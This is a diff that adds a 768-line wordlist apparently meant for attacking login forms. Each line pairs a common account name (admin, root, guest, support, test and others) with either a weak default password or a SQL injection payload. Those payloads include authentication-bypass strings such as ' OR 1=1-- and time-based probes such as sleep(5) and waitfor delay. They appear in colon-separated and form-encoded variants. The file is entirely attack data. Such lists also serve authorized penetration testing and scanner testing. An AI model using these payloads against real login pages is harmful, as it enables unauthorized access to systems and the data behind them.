@@ -1,0 +1,768 @@
+admin:" OR "" = "
+admin:' OR ''='
+admin:' OR '1'='1
+admin:' OR 'a'='a
+admin:' OR 1=1 LIMIT 1--
+admin:' OR 1=1#
+admin:' OR 1=1--
+admin:' or '1'='1'#
+admin:' or 1=1 /*
+admin:' or 1=1#
+admin:' or sleep(5)--
+admin:' waitfor delay '0:0:5'--
+admin:';--
+admin:1' OR '1' = '1
+admin:1234
+admin:123456
+admin:admin
+admin:admin'#
+admin:admin'--
+admin:admin123
+admin:letmein
+admin:pass
+admin:password
+admin:qwerty
+administrator:" OR "" = "
+administrator:' OR ''='
+administrator:' OR '1'='1
+administrator:' OR 'a'='a
+administrator:' OR 1=1 LIMIT 1--
+administrator:' OR 1=1#
+administrator:' OR 1=1--
+administrator:' or '1'='1'#
+administrator:' or 1=1 /*
+administrator:' or 1=1#
+administrator:' or sleep(5)--
+administrator:' waitfor delay '0:0:5'--
+administrator:';--
+administrator:1' OR '1' = '1
+administrator:1234
+administrator:123456
+administrator:admin
+administrator:admin'#
+administrator:admin'--
+administrator:admin123
+administrator:letmein
+administrator:pass
+administrator:password
+administrator:qwerty
+guest:" OR "" = "
+guest:' OR ''='
+guest:' OR '1'='1
+guest:' OR 'a'='a
+guest:' OR 1=1 LIMIT 1--
+guest:' OR 1=1#
+guest:' OR 1=1--
+guest:' or '1'='1'#
+guest:' or 1=1 /*
+guest:' or 1=1#
+guest:' or sleep(5)--
+guest:' waitfor delay '0:0:5'--
+guest:';--
+guest:1' OR '1' = '1
+guest:1234
+guest:123456
+guest:admin
+guest:admin'#
+guest:admin'--
+guest:admin123
+guest:letmein
+guest:pass
+guest:password
+guest:qwerty
+login:" OR "" = "
+login:' OR ''='
+login:' OR '1'='1
+login:' OR 'a'='a
+login:' OR 1=1 LIMIT 1--
+login:' OR 1=1#
+login:' OR 1=1--
+login:' or '1'='1'#
+login:' or 1=1 /*
+login:' or 1=1#
+login:' or sleep(5)--
+login:' waitfor delay '0:0:5'--
+login:';--
+login:1' OR '1' = '1
+login:1234
+login:123456
+login:admin
+login:admin'#
+login:admin'--
+login:admin123
+login:letmein
+login:pass
+login:password
+login:qwerty
+login=admin&pw=" OR "" = "
+login=admin&pw=' OR ''='
+login=admin&pw=' OR '1'='1
+login=admin&pw=' OR 'a'='a
+login=admin&pw=' OR 1=1 LIMIT 1--
+login=admin&pw=' OR 1=1#
+login=admin&pw=' OR 1=1--
+login=admin&pw=' or '1'='1'#
+login=admin&pw=' or 1=1 /*
+login=admin&pw=' or 1=1#
+login=admin&pw=' or sleep(5)--
+login=admin&pw=' waitfor delay '0:0:5'--
+login=admin&pw=';--
+login=admin&pw=1' OR '1' = '1
+login=admin&pw=1234
+login=admin&pw=123456
+login=admin&pw=admin
+login=admin&pw=admin'#
+login=admin&pw=admin'--
+login=admin&pw=admin123
+login=admin&pw=letmein
+login=admin&pw=pass
+login=admin&pw=password
+login=admin&pw=qwerty
+login=administrator&pw=" OR "" = "
+login=administrator&pw=' OR ''='
+login=administrator&pw=' OR '1'='1
+login=administrator&pw=' OR 'a'='a
+login=administrator&pw=' OR 1=1 LIMIT 1--
+login=administrator&pw=' OR 1=1#
+login=administrator&pw=' OR 1=1--
+login=administrator&pw=' or '1'='1'#
+login=administrator&pw=' or 1=1 /*
+login=administrator&pw=' or 1=1#
+login=administrator&pw=' or sleep(5)--
+login=administrator&pw=' waitfor delay '0:0:5'--
+login=administrator&pw=';--
+login=administrator&pw=1' OR '1' = '1
+login=administrator&pw=1234
+login=administrator&pw=123456
+login=administrator&pw=admin
+login=administrator&pw=admin'#
+login=administrator&pw=admin'--
+login=administrator&pw=admin123
+login=administrator&pw=letmein
+login=administrator&pw=pass
+login=administrator&pw=password
+login=administrator&pw=qwerty
+login=guest&pw=" OR "" = "
+login=guest&pw=' OR ''='
+login=guest&pw=' OR '1'='1
+login=guest&pw=' OR 'a'='a
+login=guest&pw=' OR 1=1 LIMIT 1--
+login=guest&pw=' OR 1=1#
+login=guest&pw=' OR 1=1--
+login=guest&pw=' or '1'='1'#
+login=guest&pw=' or 1=1 /*
+login=guest&pw=' or 1=1#
+login=guest&pw=' or sleep(5)--
+login=guest&pw=' waitfor delay '0:0:5'--
+login=guest&pw=';--
+login=guest&pw=1' OR '1' = '1
+login=guest&pw=1234
+login=guest&pw=123456
+login=guest&pw=admin
+login=guest&pw=admin'#
+login=guest&pw=admin'--
+login=guest&pw=admin123
+login=guest&pw=letmein
+login=guest&pw=pass
+login=guest&pw=password
+login=guest&pw=qwerty
+login=login&pw=" OR "" = "
+login=login&pw=' OR ''='
+login=login&pw=' OR '1'='1
+login=login&pw=' OR 'a'='a
+login=login&pw=' OR 1=1 LIMIT 1--
+login=login&pw=' OR 1=1#
+login=login&pw=' OR 1=1--
+login=login&pw=' or '1'='1'#
+login=login&pw=' or 1=1 /*
+login=login&pw=' or 1=1#
+login=login&pw=' or sleep(5)--
+login=login&pw=' waitfor delay '0:0:5'--
+login=login&pw=';--
+login=login&pw=1' OR '1' = '1
+login=login&pw=1234
+login=login&pw=123456
+login=login&pw=admin
+login=login&pw=admin'#
+login=login&pw=admin'--
+login=login&pw=admin123
+login=login&pw=letmein
+login=login&pw=pass
+login=login&pw=password
+login=login&pw=qwerty
+login=root&pw=" OR "" = "
+login=root&pw=' OR ''='
+login=root&pw=' OR '1'='1
+login=root&pw=' OR 'a'='a
+login=root&pw=' OR 1=1 LIMIT 1--
+login=root&pw=' OR 1=1#
+login=root&pw=' OR 1=1--
+login=root&pw=' or '1'='1'#
+login=root&pw=' or 1=1 /*
+login=root&pw=' or 1=1#
+login=root&pw=' or sleep(5)--
+login=root&pw=' waitfor delay '0:0:5'--
+login=root&pw=';--
+login=root&pw=1' OR '1' = '1
+login=root&pw=1234
+login=root&pw=123456
+login=root&pw=admin
+login=root&pw=admin'#
+login=root&pw=admin'--
+login=root&pw=admin123
+login=root&pw=letmein
+login=root&pw=pass
+login=root&pw=password
+login=root&pw=qwerty
+login=support&pw=" OR "" = "
+login=support&pw=' OR ''='
+login=support&pw=' OR '1'='1
+login=support&pw=' OR 'a'='a
+login=support&pw=' OR 1=1 LIMIT 1--
+login=support&pw=' OR 1=1#
+login=support&pw=' OR 1=1--
+login=support&pw=' or '1'='1'#
+login=support&pw=' or 1=1 /*
+login=support&pw=' or 1=1#
+login=support&pw=' or sleep(5)--
+login=support&pw=' waitfor delay '0:0:5'--
+login=support&pw=';--
+login=support&pw=1' OR '1' = '1
+login=support&pw=1234
+login=support&pw=123456
+login=support&pw=admin
+login=support&pw=admin'#
+login=support&pw=admin'--
+login=support&pw=admin123
+login=support&pw=letmein
+login=support&pw=pass
+login=support&pw=password
+login=support&pw=qwerty
+login=test&pw=" OR "" = "
+login=test&pw=' OR ''='
+login=test&pw=' OR '1'='1
+login=test&pw=' OR 'a'='a
+login=test&pw=' OR 1=1 LIMIT 1--
+login=test&pw=' OR 1=1#
+login=test&pw=' OR 1=1--
+login=test&pw=' or '1'='1'#
+login=test&pw=' or 1=1 /*
+login=test&pw=' or 1=1#
+login=test&pw=' or sleep(5)--
+login=test&pw=' waitfor delay '0:0:5'--
+login=test&pw=';--
+login=test&pw=1' OR '1' = '1
+login=test&pw=1234
+login=test&pw=123456
+login=test&pw=admin
+login=test&pw=admin'#
+login=test&pw=admin'--
+login=test&pw=admin123
+login=test&pw=letmein
+login=test&pw=pass
+login=test&pw=password
+login=test&pw=qwerty
+login=user&pw=" OR "" = "
+login=user&pw=' OR ''='
+login=user&pw=' OR '1'='1
+login=user&pw=' OR 'a'='a
+login=user&pw=' OR 1=1 LIMIT 1--
+login=user&pw=' OR 1=1#
+login=user&pw=' OR 1=1--
+login=user&pw=' or '1'='1'#
+login=user&pw=' or 1=1 /*
+login=user&pw=' or 1=1#
+login=user&pw=' or sleep(5)--
+login=user&pw=' waitfor delay '0:0:5'--
+login=user&pw=';--
+login=user&pw=1' OR '1' = '1
+login=user&pw=1234
+login=user&pw=123456
+login=user&pw=admin
+login=user&pw=admin'#
+login=user&pw=admin'--
+login=user&pw=admin123
+login=user&pw=letmein
+login=user&pw=pass
+login=user&pw=password
+login=user&pw=qwerty
+root:" OR "" = "
+root:' OR ''='
+root:' OR '1'='1
+root:' OR 'a'='a
+root:' OR 1=1 LIMIT 1--
+root:' OR 1=1#
+root:' OR 1=1--
+root:' or '1'='1'#
+root:' or 1=1 /*
+root:' or 1=1#
+root:' or sleep(5)--
+root:' waitfor delay '0:0:5'--
+root:';--
+root:1' OR '1' = '1
+root:1234
+root:123456
+root:admin
+root:admin'#
+root:admin'--
+root:admin123
+root:letmein
+root:pass
+root:password
+root:qwerty
+support:" OR "" = "
+support:' OR ''='
+support:' OR '1'='1
+support:' OR 'a'='a
+support:' OR 1=1 LIMIT 1--
+support:' OR 1=1#
+support:' OR 1=1--
+support:' or '1'='1'#
+support:' or 1=1 /*
+support:' or 1=1#
+support:' or sleep(5)--
+support:' waitfor delay '0:0:5'--
+support:';--
+support:1' OR '1' = '1
+support:1234
+support:123456
+support:admin
+support:admin'#
+support:admin'--
+support:admin123
+support:letmein
+support:pass
+support:password
+support:qwerty
+test:" OR "" = "
+test:' OR ''='
+test:' OR '1'='1
+test:' OR 'a'='a
+test:' OR 1=1 LIMIT 1--
+test:' OR 1=1#
+test:' OR 1=1--
+test:' or '1'='1'#
+test:' or 1=1 /*
+test:' or 1=1#
+test:' or sleep(5)--
+test:' waitfor delay '0:0:5'--
+test:';--
+test:1' OR '1' = '1
+test:1234
+test:123456
+test:admin
+test:admin'#
+test:admin'--
+test:admin123
+test:letmein
+test:pass
+test:password
+test:qwerty
+user:" OR "" = "
+user:' OR ''='
+user:' OR '1'='1
+user:' OR 'a'='a
+user:' OR 1=1 LIMIT 1--
+user:' OR 1=1#
+user:' OR 1=1--
+user:' or '1'='1'#
+user:' or 1=1 /*
+user:' or 1=1#
+user:' or sleep(5)--
+user:' waitfor delay '0:0:5'--
+user:';--
+user:1' OR '1' = '1
+user:1234
+user:123456
+user:admin
+user:admin'#
+user:admin'--
+user:admin123
+user:letmein
+user:pass
+user:password
+user:qwerty
+user=admin&pass=" OR "" = "
+user=admin&pass=' OR ''='
+user=admin&pass=' OR '1'='1
+user=admin&pass=' OR 'a'='a
+user=admin&pass=' OR 1=1 LIMIT 1--
+user=admin&pass=' OR 1=1#
+user=admin&pass=' OR 1=1--
+user=admin&pass=' or '1'='1'#
+user=admin&pass=' or 1=1 /*
+user=admin&pass=' or 1=1#
+user=admin&pass=' or sleep(5)--
+user=admin&pass=' waitfor delay '0:0:5'--
+user=admin&pass=';--
+user=admin&pass=1' OR '1' = '1
+user=admin&pass=1234
+user=admin&pass=123456
+user=admin&pass=admin
+user=admin&pass=admin'#
+user=admin&pass=admin'--
+user=admin&pass=admin123
+user=admin&pass=letmein
+user=admin&pass=pass
+user=admin&pass=password
+user=admin&pass=qwerty
+user=administrator&pass=" OR "" = "
+user=administrator&pass=' OR ''='
+user=administrator&pass=' OR '1'='1
+user=administrator&pass=' OR 'a'='a
+user=administrator&pass=' OR 1=1 LIMIT 1--
+user=administrator&pass=' OR 1=1#
+user=administrator&pass=' OR 1=1--
+user=administrator&pass=' or '1'='1'#
+user=administrator&pass=' or 1=1 /*
+user=administrator&pass=' or 1=1#
+user=administrator&pass=' or sleep(5)--
+user=administrator&pass=' waitfor delay '0:0:5'--
+user=administrator&pass=';--
+user=administrator&pass=1' OR '1' = '1
+user=administrator&pass=1234
+user=administrator&pass=123456
+user=administrator&pass=admin
+user=administrator&pass=admin'#
+user=administrator&pass=admin'--
+user=administrator&pass=admin123
+user=administrator&pass=letmein
+user=administrator&pass=pass
+user=administrator&pass=password
+user=administrator&pass=qwerty
+user=guest&pass=" OR "" = "
+user=guest&pass=' OR ''='
+user=guest&pass=' OR '1'='1
+user=guest&pass=' OR 'a'='a
+user=guest&pass=' OR 1=1 LIMIT 1--
+user=guest&pass=' OR 1=1#
+user=guest&pass=' OR 1=1--
+user=guest&pass=' or '1'='1'#
+user=guest&pass=' or 1=1 /*
+user=guest&pass=' or 1=1#
+user=guest&pass=' or sleep(5)--
+user=guest&pass=' waitfor delay '0:0:5'--
+user=guest&pass=';--
+user=guest&pass=1' OR '1' = '1
+user=guest&pass=1234
+user=guest&pass=123456
+user=guest&pass=admin
+user=guest&pass=admin'#
+user=guest&pass=admin'--
+user=guest&pass=admin123
+user=guest&pass=letmein
+user=guest&pass=pass
+user=guest&pass=password
+user=guest&pass=qwerty
+user=login&pass=" OR "" = "
+user=login&pass=' OR ''='
+user=login&pass=' OR '1'='1
+user=login&pass=' OR 'a'='a
+user=login&pass=' OR 1=1 LIMIT 1--
+user=login&pass=' OR 1=1#
+user=login&pass=' OR 1=1--
+user=login&pass=' or '1'='1'#
+user=login&pass=' or 1=1 /*
+user=login&pass=' or 1=1#
+user=login&pass=' or sleep(5)--
+user=login&pass=' waitfor delay '0:0:5'--
+user=login&pass=';--
+user=login&pass=1' OR '1' = '1
+user=login&pass=1234
+user=login&pass=123456
+user=login&pass=admin
+user=login&pass=admin'#
+user=login&pass=admin'--
+user=login&pass=admin123
+user=login&pass=letmein
+user=login&pass=pass
+user=login&pass=password
+user=login&pass=qwerty
+user=root&pass=" OR "" = "
+user=root&pass=' OR ''='
+user=root&pass=' OR '1'='1
+user=root&pass=' OR 'a'='a
+user=root&pass=' OR 1=1 LIMIT 1--
+user=root&pass=' OR 1=1#
+user=root&pass=' OR 1=1--
+user=root&pass=' or '1'='1'#
+user=root&pass=' or 1=1 /*
+user=root&pass=' or 1=1#
+user=root&pass=' or sleep(5)--
+user=root&pass=' waitfor delay '0:0:5'--
+user=root&pass=';--
+user=root&pass=1' OR '1' = '1
+user=root&pass=1234
+user=root&pass=123456
+user=root&pass=admin
+user=root&pass=admin'#
+user=root&pass=admin'--
+user=root&pass=admin123
+user=root&pass=letmein
+user=root&pass=pass
+user=root&pass=password
+user=root&pass=qwerty
+user=support&pass=" OR "" = "
+user=support&pass=' OR ''='
+user=support&pass=' OR '1'='1
+user=support&pass=' OR 'a'='a
+user=support&pass=' OR 1=1 LIMIT 1--
+user=support&pass=' OR 1=1#
+user=support&pass=' OR 1=1--
+user=support&pass=' or '1'='1'#
+user=support&pass=' or 1=1 /*
+user=support&pass=' or 1=1#
+user=support&pass=' or sleep(5)--
+user=support&pass=' waitfor delay '0:0:5'--
+user=support&pass=';--
+user=support&pass=1' OR '1' = '1
+user=support&pass=1234
+user=support&pass=123456
+user=support&pass=admin
+user=support&pass=admin'#
+user=support&pass=admin'--
+user=support&pass=admin123
+user=support&pass=letmein
+user=support&pass=pass
+user=support&pass=password
+user=support&pass=qwerty
+user=test&pass=" OR "" = "
+user=test&pass=' OR ''='
+user=test&pass=' OR '1'='1
+user=test&pass=' OR 'a'='a
+user=test&pass=' OR 1=1 LIMIT 1--
+user=test&pass=' OR 1=1#
+user=test&pass=' OR 1=1--
+user=test&pass=' or '1'='1'#
+user=test&pass=' or 1=1 /*
+user=test&pass=' or 1=1#
+user=test&pass=' or sleep(5)--
+user=test&pass=' waitfor delay '0:0:5'--
+user=test&pass=';--
+user=test&pass=1' OR '1' = '1
+user=test&pass=1234
+user=test&pass=123456
+user=test&pass=admin
+user=test&pass=admin'#
+user=test&pass=admin'--
+user=test&pass=admin123
+user=test&pass=letmein
+user=test&pass=pass
+user=test&pass=password
+user=test&pass=qwerty
+user=user&pass=" OR "" = "
+user=user&pass=' OR ''='
+user=user&pass=' OR '1'='1
+user=user&pass=' OR 'a'='a
+user=user&pass=' OR 1=1 LIMIT 1--
+user=user&pass=' OR 1=1#
+user=user&pass=' OR 1=1--
+user=user&pass=' or '1'='1'#
+user=user&pass=' or 1=1 /*
+user=user&pass=' or 1=1#
+user=user&pass=' or sleep(5)--
+user=user&pass=' waitfor delay '0:0:5'--
+user=user&pass=';--
+user=user&pass=1' OR '1' = '1
+user=user&pass=1234
+user=user&pass=123456
+user=user&pass=admin
+user=user&pass=admin'#
+user=user&pass=admin'--
+user=user&pass=admin123
+user=user&pass=letmein
+user=user&pass=pass
+user=user&pass=password
+user=user&pass=qwerty
+username=admin&password=" OR "" = "
+username=admin&password=' OR ''='
+username=admin&password=' OR '1'='1
+username=admin&password=' OR 'a'='a
+username=admin&password=' OR 1=1 LIMIT 1--
+username=admin&password=' OR 1=1#
+username=admin&password=' OR 1=1--
+username=admin&password=' or '1'='1'#
+username=admin&password=' or 1=1 /*
+username=admin&password=' or 1=1#
+username=admin&password=' or sleep(5)--
+username=admin&password=' waitfor delay '0:0:5'--
+username=admin&password=';--
+username=admin&password=1' OR '1' = '1
+username=admin&password=1234
+username=admin&password=123456
+username=admin&password=admin
+username=admin&password=admin'#
+username=admin&password=admin'--
+username=admin&password=admin123
+username=admin&password=letmein
+username=admin&password=pass
+username=admin&password=password
+username=admin&password=qwerty
+username=administrator&password=" OR "" = "
+username=administrator&password=' OR ''='
+username=administrator&password=' OR '1'='1
+username=administrator&password=' OR 'a'='a
+username=administrator&password=' OR 1=1 LIMIT 1--
+username=administrator&password=' OR 1=1#
+username=administrator&password=' OR 1=1--
+username=administrator&password=' or '1'='1'#
+username=administrator&password=' or 1=1 /*
+username=administrator&password=' or 1=1#
+username=administrator&password=' or sleep(5)--
+username=administrator&password=' waitfor delay '0:0:5'--
+username=administrator&password=';--
+username=administrator&password=1' OR '1' = '1
+username=administrator&password=1234
+username=administrator&password=123456
+username=administrator&password=admin
+username=administrator&password=admin'#
+username=administrator&password=admin'--
+username=administrator&password=admin123
+username=administrator&password=letmein
+username=administrator&password=pass
+username=administrator&password=password
+username=administrator&password=qwerty
+username=guest&password=" OR "" = "
+username=guest&password=' OR ''='
+username=guest&password=' OR '1'='1
+username=guest&password=' OR 'a'='a
+username=guest&password=' OR 1=1 LIMIT 1--
+username=guest&password=' OR 1=1#
+username=guest&password=' OR 1=1--
+username=guest&password=' or '1'='1'#
+username=guest&password=' or 1=1 /*
+username=guest&password=' or 1=1#
+username=guest&password=' or sleep(5)--
+username=guest&password=' waitfor delay '0:0:5'--
+username=guest&password=';--
+username=guest&password=1' OR '1' = '1
+username=guest&password=1234
+username=guest&password=123456
+username=guest&password=admin
+username=guest&password=admin'#
+username=guest&password=admin'--
+username=guest&password=admin123
+username=guest&password=letmein
+username=guest&password=pass
+username=guest&password=password
+username=guest&password=qwerty
+username=login&password=" OR "" = "
+username=login&password=' OR ''='
+username=login&password=' OR '1'='1
+username=login&password=' OR 'a'='a
+username=login&password=' OR 1=1 LIMIT 1--
+username=login&password=' OR 1=1#
+username=login&password=' OR 1=1--
+username=login&password=' or '1'='1'#
+username=login&password=' or 1=1 /*
+username=login&password=' or 1=1#
+username=login&password=' or sleep(5)--
+username=login&password=' waitfor delay '0:0:5'--
+username=login&password=';--
+username=login&password=1' OR '1' = '1
+username=login&password=1234
+username=login&password=123456
+username=login&password=admin
+username=login&password=admin'#
+username=login&password=admin'--
+username=login&password=admin123
+username=login&password=letmein
+username=login&password=pass
+username=login&password=password
+username=login&password=qwerty
+username=root&password=" OR "" = "
+username=root&password=' OR ''='
+username=root&password=' OR '1'='1
+username=root&password=' OR 'a'='a
+username=root&password=' OR 1=1 LIMIT 1--
+username=root&password=' OR 1=1#
+username=root&password=' OR 1=1--
+username=root&password=' or '1'='1'#
+username=root&password=' or 1=1 /*
+username=root&password=' or 1=1#
+username=root&password=' or sleep(5)--
+username=root&password=' waitfor delay '0:0:5'--
+username=root&password=';--
+username=root&password=1' OR '1' = '1
+username=root&password=1234
+username=root&password=123456
+username=root&password=admin
+username=root&password=admin'#
+username=root&password=admin'--
+username=root&password=admin123
+username=root&password=letmein
+username=root&password=pass
+username=root&password=password
+username=root&password=qwerty
+username=support&password=" OR "" = "
+username=support&password=' OR ''='
+username=support&password=' OR '1'='1
+username=support&password=' OR 'a'='a
+username=support&password=' OR 1=1 LIMIT 1--
+username=support&password=' OR 1=1#
+username=support&password=' OR 1=1--
+username=support&password=' or '1'='1'#
+username=support&password=' or 1=1 /*
+username=support&password=' or 1=1#
+username=support&password=' or sleep(5)--
+username=support&password=' waitfor delay '0:0:5'--
+username=support&password=';--
+username=support&password=1' OR '1' = '1
+username=support&password=1234
+username=support&password=123456
+username=support&password=admin
+username=support&password=admin'#
+username=support&password=admin'--
+username=support&password=admin123
+username=support&password=letmein
+username=support&password=pass
+username=support&password=password
+username=support&password=qwerty
+username=test&password=" OR "" = "
+username=test&password=' OR ''='
+username=test&password=' OR '1'='1
+username=test&password=' OR 'a'='a
+username=test&password=' OR 1=1 LIMIT 1--
+username=test&password=' OR 1=1#
+username=test&password=' OR 1=1--
+username=test&password=' or '1'='1'#
+username=test&password=' or 1=1 /*
+username=test&password=' or 1=1#
+username=test&password=' or sleep(5)--
+username=test&password=' waitfor delay '0:0:5'--
+username=test&password=';--
+username=test&password=1' OR '1' = '1
+username=test&password=1234
+username=test&password=123456
+username=test&password=admin
+username=test&password=admin'#
+username=test&password=admin'--
+username=test&password=admin123
+username=test&password=letmein
+username=test&password=pass
+username=test&password=password
+username=test&password=qwerty
+username=user&password=" OR "" = "
+username=user&password=' OR ''='
+username=user&password=' OR '1'='1
+username=user&password=' OR 'a'='a
+username=user&password=' OR 1=1 LIMIT 1--
+username=user&password=' OR 1=1#
+username=user&password=' OR 1=1--
+username=user&password=' or '1'='1'#
+username=user&password=' or 1=1 /*
+username=user&password=' or 1=1#
+username=user&password=' or sleep(5)--
+username=user&password=' waitfor delay '0:0:5'--
+username=user&password=';--
+username=user&password=1' OR '1' = '1
+username=user&password=1234
+username=user&password=123456
+username=user&password=admin
+username=user&password=admin'#
+username=user&password=admin'--
+username=user&password=admin123
+username=user&password=letmein
+username=user&password=pass
+username=user&password=password
+username=user&password=qwerty
